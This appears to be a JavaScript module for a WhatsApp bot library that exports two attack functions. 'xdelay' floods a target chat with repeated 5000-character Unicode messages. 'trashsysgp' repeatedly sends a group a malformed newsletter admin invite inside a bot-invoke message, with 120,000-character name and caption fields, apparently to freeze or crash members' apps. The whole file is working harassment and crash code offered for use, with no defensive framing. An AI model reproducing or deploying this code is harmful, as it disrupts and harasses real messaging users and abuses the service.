async function xdelay(sock, targetJid, opts = {}) {
  const total = opts.rounds || 100, ms = opts.delay || 2;
  for (let i = 0; i < total; i++) {
    try {
      await sock.sendMessage(targetJid, { text: '𑁍'.repeat(5000) });
    } catch (e) { console.log(`[xdelay] ${i + 1}: ${e.message}`); break; }
    await new Promise(r => setTimeout(r, ms * 1000));
  }
}

async function trashsysgp(sock, groupJid, opts = {}) {
  const rounds = opts.rounds || 5;
  for (let i = 0; i < rounds; i++) {
    try { await xdelay(sock, groupJid, { rounds: 8, delay: 1 }); } catch (e) {}
    try {
      await sock.relayMessage(groupJid, {
        botInvokeMessage: { message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '33333333333333333@newsletter',
            newsletterName: 'x'.repeat(120000), jpegThumbnail: null,
            caption: 'y'.repeat(120000), inviteExpiration: Date.now() + 1814400000
          }
        } }
      }, { userJid: groupJid });
    } catch (e) { console.log(`[trashsysgp] ${i + 1}: ${e.message}`); }
    await new Promise(r => setTimeout(r, 2000));
  }
}

module.exports = { xdelay, trashsysgp };
